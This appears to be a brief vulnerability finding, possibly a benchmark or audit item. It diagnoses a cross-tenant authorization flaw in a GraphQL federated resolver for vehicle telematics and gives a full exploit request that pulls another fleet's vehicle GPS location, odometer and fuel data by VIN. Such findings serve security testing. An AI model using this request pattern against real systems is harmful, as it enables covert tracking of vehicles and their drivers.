diagnosis: The VehicleTelematicsReport federated entity resolver reads real-time telematics from Redis solely using the vin key passed in the federated representation. It fails to check whether the vehicle belongs to the fleet organization specified in context.fleetTenant, allowing an attacker to track the physical GPS location, odometer, and fuel levels of vehicles across different fleet operators.
exploit_request:
POST /graphql/telematics HTTP/1.1
Host: fleet-iot.platform.internal:7000
Content-Type: application/json
X-Fleet-Tenant: tenant_alpha_rentals

{"query": "query { _entities(representations: [{ __typename: \"VehicleTelematicsReport\", vin: \"1HGCR2F83HA001928\" }]) { ... on VehicleTelematicsReport { vin latitude longitude odometerKm fuelLevelPct lastEnginePing } } }"}
